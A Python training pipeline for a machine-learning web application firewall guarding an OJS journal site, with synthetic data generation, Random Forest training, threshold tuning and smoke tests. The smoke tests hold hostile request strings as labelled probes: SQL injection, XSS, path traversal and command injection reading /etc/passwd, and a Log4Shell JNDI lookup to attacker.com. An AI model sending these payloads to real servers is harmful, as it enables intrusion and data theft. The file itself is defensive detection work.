"""
WAF ML training pipeline.

The pipeline materializes a realistic OJS dataset in memory via
`ml_training.dataset_generator`, never reads CSV files, and produces a
Random Forest bundle the runtime sidecar can load with feature-name
verification.

CLI
---
    python -m ml_training.train_pipeline                       # default config
    python -m ml_training.train_pipeline --write-dataset       # also dump CSVs
    python -m ml_training.train_pipeline --threshold-sweep     # PR/F1 table
    python -m ml_training.train_pipeline --n-benign 6000 \\
        --n-attack-per-type 800 --seed 7

Model bundle layout
-------------------
    {
        "model": sklearn.ensemble.RandomForestClassifier,
        "feature_names": [...],          # parity check at runtime
        "block_threshold": float,         # recommended threshold
        "attack_types": [...],
        "model_version": "rf-realistic-v1",
        "trained_at": "<ISO 8601 UTC>"
    }
"""

from __future__ import annotations

import argparse
import pickle
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import (
    classification_report,
    confusion_matrix,
    f1_score,
    precision_score,
    recall_score,
    roc_auc_score,
)
from sklearn.model_selection import train_test_split

from ml_training.dataset_generator import (
    ATTACK_TYPES,
    generate_dataset,
    write_schema_v3_csvs,
)
from ml_training.features import FEATURE_NAMES, NUM_FEATURES, extract_features

PROJECT_DIR = Path(__file__).resolve().parent.parent
MODEL_PATH = PROJECT_DIR / "ml_training" / "waf_model.pkl"
DATASET_OUTPUT_DIR = PROJECT_DIR / "dataset" / "synthetic"

MODEL_VERSION = "rf-realistic-v1"


@dataclass(frozen=True)
class TrainingConfig:
    n_benign: int = 6000
    n_attack_per_type: int = 600
    n_estimators: int = 200
    max_depth: int = 14
    seed: int = 42
    test_size: float = 0.2
    default_threshold: float = 0.50  # threshold sweep refines


# ---------------------------------------------------------------------------
# Feature matrix
# ---------------------------------------------------------------------------

def build_feature_matrix(df: pd.DataFrame) -> tuple[np.ndarray, np.ndarray, np.ndarray]:
    """
    Build (X, y, attack_labels) for stratification.

    The `req_rate` feature is computed inline over a 60s rolling window per
    source IP, ordered by timestamp — matching the runtime behavior of
    `core/sidecar_agent.SidecarWAF.predict`.
    """
    df = df.copy()
    df["timestamp_dt"] = pd.to_datetime(
        df["timestamp"], format="mixed", errors="coerce", utc=True
    )
    df = df.sort_values("timestamp_dt").reset_index(drop=True)

    ip_history: dict[str, list[float]] = {}
    rows: list[list[float]] = []
    y: list[int] = []
    attack_labels: list[str] = []

    for _, row in df.iterrows():
        ip = str(row.get("source_ip", ""))
        ts = row.get("timestamp_dt")
        rate = 0.0
        if pd.notna(ts):
            ts_val = ts.timestamp()
            recent = [t for t in ip_history.get(ip, []) if ts_val - t < 60]
            recent.append(ts_val)
            ip_history[ip] = recent
            rate = float(len(recent))

        feats = extract_features(
            method=str(row.get("method", "GET")),
            uri=str(row.get("uri", "")),
            query_string=str(row.get("query_string", "")),
            body=str(row.get("body_truncated", "")),
            headers=str(row.get("headers_raw", "")),
            stateful_req_rate=rate,
        )
        rows.append(feats)
        y.append(1 if str(row.get("decision", "PASS")).upper() == "BLOCK" else 0)
        attack_labels.append(str(row.get("attack_type", "NONE")))

    return np.array(rows, dtype=float), np.array(y, dtype=int), np.array(attack_labels)


# ---------------------------------------------------------------------------
# Evaluation helpers
# ---------------------------------------------------------------------------

def print_confusion_matrix(y_true: np.ndarray, y_pred: np.ndarray) -> None:
    cm = confusion_matrix(y_true, y_pred)
    tn, fp, fn, tp = cm.ravel()
    print("\n  Confusion Matrix:")
    print(f"               Predicted PASS  Predicted BLOCK")
    print(f"  Actual PASS       {tn:6d}          {fp:6d}")
    print(f"  Actual BLOCK      {fn:6d}          {tp:6d}")


def print_per_attack_recall(
    attack_labels_test: np.ndarray, y_true: np.ndarray, y_pred: np.ndarray
) -> None:
    print("\n  Per-Attack-Type Recall:")
    for atype in ATTACK_TYPES:
        mask = (attack_labels_test == atype)
        if mask.sum() == 0:
            continue
        total = int(mask.sum())
        true_positive = int(((y_true[mask] == 1) & (y_pred[mask] == 1)).sum())
        missed = int(((y_true[mask] == 1) & (y_pred[mask] == 0)).sum())
        recall = (
            true_positive / (true_positive + missed)
            if (true_positive + missed) else 0.0
        )
        print(
            f"    {atype:<22} total={total:4d}  detected={true_positive:4d}  "
            f"missed={missed:4d}  recall={recall:.2%}"
        )

    benign_mask = (attack_labels_test == "NONE")
    if benign_mask.sum():
        false_positive = int(
            ((y_true[benign_mask] == 0) & (y_pred[benign_mask] == 1)).sum()
        )
        fpr = false_positive / int(benign_mask.sum())
        print(
            f"    {'BENIGN':<22} total={int(benign_mask.sum()):4d}  "
            f"false_positives={false_positive:4d}  fpr={fpr:.2%}"
        )


def threshold_sweep(y_true: np.ndarray, y_proba: np.ndarray) -> float:
    print("\n  Threshold Sweep (attack class):")
    print(f"  {'Threshold':>10}  {'Precision':>10}  {'Recall':>8}  {'F1':>8}")
    best_f1, best_thresh = 0.0, 0.50
    for t in np.arange(0.30, 0.96, 0.05):
        y_pred_t = (y_proba >= t).astype(int)
        p = precision_score(y_true, y_pred_t, zero_division=0)
        r = recall_score(y_true, y_pred_t, zero_division=0)
        f = f1_score(y_true, y_pred_t, zero_division=0)
        marker = " <-- best so far" if f > best_f1 else ""
        print(f"  {t:>10.2f}  {p:>10.4f}  {r:>8.4f}  {f:>8.4f}{marker}")
        if f > best_f1:
            best_f1, best_thresh = f, float(t)
    print(f"\n  Best threshold by F1: {best_thresh:.2f}  (F1={best_f1:.4f})")
    return best_thresh


# ---------------------------------------------------------------------------
# Held-out real-style sanity probes
# ---------------------------------------------------------------------------

_SMOKE_TESTS = [
    (
        "benign_search",
        "GET",
        "/index.php/testjournal/search/search?query=machine+learning",
        "query=machine+learning",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
    (
        "benign_article_view",
        "GET",
        "/index.php/testjournal/article/view/42",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
    (
        "sqli_url_encoded",
        "GET",
        "/index.php/testjournal/search/search?query=%27%20OR%20%271%27%3D%271",
        "query=%27%20OR%20%271%27%3D%271",
        "",
        "Host: ojs.local\r\nUser-Agent: sqlmap/1.7",
        1,
    ),
    (
        "sqli_comment_split",
        "GET",
        "/index.php/testjournal/search/search?query=UN/**/ION/**/SE/**/LECT+1,2,3",
        "query=UN/**/ION/**/SE/**/LECT+1,2,3",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        1,
    ),
    (
        "sqli_time_based",
        "GET",
        "/index.php/testjournal/article/view/1'+AND+SLEEP(5)--",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        1,
    ),
    (
        "xss_svg",
        "GET",
        "/index.php/testjournal/search/search?query=%3Csvg/onload=alert(1)%3E",
        "query=%3Csvg/onload=alert(1)%3E",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        1,
    ),
    (
        "xss_event_handler",
        "POST",
        "/index.php/testjournal/comments/save",
        "",
        "comment=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&article=42",
        "Host: ojs.local\r\nUser-Agent: curl/7.81.0",
        1,
    ),
    (
        "path_traversal_encoded",
        "GET",
        "/index.php/testjournal/article/download/1/..%2f..%2f..%2fetc%2fpasswd",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Wget/1.21.3",
        1,
    ),
    (
        "cmd_injection_ifs",
        "GET",
        "/index.php/testjournal/search/search?query=health;cat${IFS}/etc/passwd",
        "query=health;cat${IFS}/etc/passwd",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        1,
    ),
    (
        "log4shell_jndi",
        "GET",
        "/index.php/testjournal/search/search?q=${jndi:ldap://attacker.com/a}",
        "q=${jndi:ldap://attacker.com/a}",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        1,
    ),
    # Admin / editor / reviewer workflows — must NOT be blocked
    (
        "admin_dashboard",
        "GET",
        "/index.php/testjournal/dashboard",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        0,
    ),
    (
        "admin_submission_wizard",
        "GET",
        "/index.php/testjournal/submission/wizard/1?step=1&submissionId=42",
        "step=1&submissionId=42",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
    (
        "admin_ajax_file_api",
        "GET",
        "/index.php/testjournal/$$$call$$$/ui/file-api/get-files?stageId=2&submissionId=10",
        "stageId=2&submissionId=10",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
    (
        "admin_manager_setup",
        "GET",
        "/index.php/testjournal/manager/setup/index",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
    (
        "editor_submissions",
        "GET",
        "/index.php/testjournal/editor/submissions",
        "",
        "",
        "Host: ojs.local\r\nUser-Agent: Mozilla/5.0",
        0,
    ),
]


def run_smoke_tests(model: RandomForestClassifier, threshold: float) -> None:
    print("\n  Held-out real-style smoke tests:")
    correct = 0
    for name, method, uri, qs, body, headers, expected in _SMOKE_TESTS:
        feats = extract_features(
            method=method, uri=uri, query_string=qs, body=body,
            headers=headers, stateful_req_rate=1.0,
        )
        proba = float(model.predict_proba(np.array([feats]))[0, 1])
        pred = 1 if proba >= threshold else 0
        ok = (pred == expected)
        correct += int(ok)
        status = "PASS" if ok else "FAIL"
        verdict = "BLOCK" if pred == 1 else "PASS"
        expect_str = "BLOCK" if expected == 1 else "PASS"
        print(
            f"    [{status}] {name:<24} pred={verdict:<5} (score={proba:.3f})  "
            f"expected={expect_str}"
        )
    print(f"\n  Smoke-test accuracy: {correct}/{len(_SMOKE_TESTS)}")


# ---------------------------------------------------------------------------
# Main pipeline
# ---------------------------------------------------------------------------

def run_pipeline(
    config: TrainingConfig,
    write_dataset: bool = False,
    show_threshold_sweep: bool = False,
) -> None:
    print("=" * 64)
    print(f"  WAF ML Training Pipeline ({MODEL_VERSION})")
    print("=" * 64)

    print(
        f"[*] Synthesizing dataset: n_benign={config.n_benign}  "
        f"n_attack_per_type={config.n_attack_per_type}  seed={config.seed}"
    )
    df = generate_dataset(
        n_benign=config.n_benign,
        n_attack_per_type=config.n_attack_per_type,
        seed=config.seed,
    )
    counts = df["attack_type"].value_counts().to_dict()
    print(f"    Class distribution: {counts}")

    if write_dataset:
        raw_path, labeled_path = write_schema_v3_csvs(df, DATASET_OUTPUT_DIR)
        print(f"    Raw CSV     -> {raw_path}")
        print(f"    Labeled CSV -> {labeled_path}")

    print("[*] Extracting features...")
    X, y, attack_labels = build_feature_matrix(df)
    print(f"    Feature matrix shape: {X.shape}  (expected cols={NUM_FEATURES})")
    assert X.shape[1] == NUM_FEATURES, (
        f"Feature dim mismatch: {X.shape[1]} != {NUM_FEATURES}"
    )

    stratify = np.where(y == 1, attack_labels, "BENIGN")
    X_train, X_test, y_train, y_test, atk_train, atk_test = train_test_split(
        X, y, attack_labels,
        test_size=config.test_size,
        random_state=config.seed,
        stratify=stratify,
    )

    print(
        f"[*] Training Random Forest "
        f"(n_estimators={config.n_estimators}, max_depth={config.max_depth}, "
        f"class_weight=balanced)..."
    )
    clf = RandomForestClassifier(
        n_estimators=config.n_estimators,
        max_depth=config.max_depth,
        class_weight="balanced",
        random_state=config.seed,
        n_jobs=-1,
    )
    clf.fit(X_train, y_train)

    y_proba = clf.predict_proba(X_test)[:, 1]
    y_pred_default = (y_proba >= config.default_threshold).astype(int)

    print("\n--- Model Evaluation (default threshold) ---")
    print(f"  Threshold: {config.default_threshold:.2f}")
    print(f"  Accuracy : {(y_pred_default == y_test).mean() * 100:.2f}%")
    print(f"  Precision: {precision_score(y_test, y_pred_default, zero_division=0):.4f}")
    print(f"  Recall   : {recall_score(y_test, y_pred_default, zero_division=0):.4f}")
    print(f"  F1       : {f1_score(y_test, y_pred_default, zero_division=0):.4f}")
    try:
        print(f"  AUC-ROC  : {roc_auc_score(y_test, y_proba):.4f}")
    except ValueError:
        pass

    print_confusion_matrix(y_test, y_pred_default)
    print("\n  Classification Report:")
    print(classification_report(
        y_test, y_pred_default, target_names=["PASS", "BLOCK"], zero_division=0
    ))
    print_per_attack_recall(atk_test, y_test, y_pred_default)

    best_thresh = threshold_sweep(y_test, y_proba)
    y_pred_best = (y_proba >= best_thresh).astype(int)
    print(f"\n--- Evaluation at best threshold ({best_thresh:.2f}) ---")
    print(f"  Precision: {precision_score(y_test, y_pred_best, zero_division=0):.4f}")
    print(f"  Recall   : {recall_score(y_test, y_pred_best, zero_division=0):.4f}")
    print(f"  F1       : {f1_score(y_test, y_pred_best, zero_division=0):.4f}")
    print_per_attack_recall(atk_test, y_test, y_pred_best)

    run_smoke_tests(clf, best_thresh)

    bundle = {
        "model": clf,
        "feature_names": list(FEATURE_NAMES),
        "block_threshold": float(best_thresh),
        "attack_types": list(ATTACK_TYPES),
        "model_version": MODEL_VERSION,
        "trained_at": datetime.now(timezone.utc).isoformat(),
    }
    MODEL_PATH.parent.mkdir(parents=True, exist_ok=True)
    with MODEL_PATH.open("wb") as f:
        pickle.dump(bundle, f)
    print(f"\n[*] Model bundle saved -> {MODEL_PATH}")
    print(
        f"    Recommended BLOCK_THRESHOLD = {best_thresh:.2f}  "
        f"(bundle also stores this for the sidecar to read at load time)."
    )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="WAF ML Training Pipeline")
    parser.add_argument("--n-benign", type=int, default=4500)
    parser.add_argument("--n-attack-per-type", type=int, default=600)
    parser.add_argument("--n-estimators", type=int, default=200)
    parser.add_argument("--max-depth", type=int, default=14)
    parser.add_argument("--seed", type=int, default=42)
    parser.add_argument(
        "--write-dataset",
        action="store_true",
        help="Also write the generated dataset to dataset/synthetic/{raw,labeled}/",
    )
    parser.add_argument(
        "--threshold-sweep",
        action="store_true",
        help="Show full precision/recall/F1 table across thresholds.",
    )
    args = parser.parse_args()

    config = TrainingConfig(
        n_benign=args.n_benign,
        n_attack_per_type=args.n_attack_per_type,
        n_estimators=args.n_estimators,
        max_depth=args.max_depth,
        seed=args.seed,
    )
    run_pipeline(
        config,
        write_dataset=args.write_dataset,
        show_threshold_sweep=args.threshold_sweep,
    )


if __name__ == "__main__":
    main()
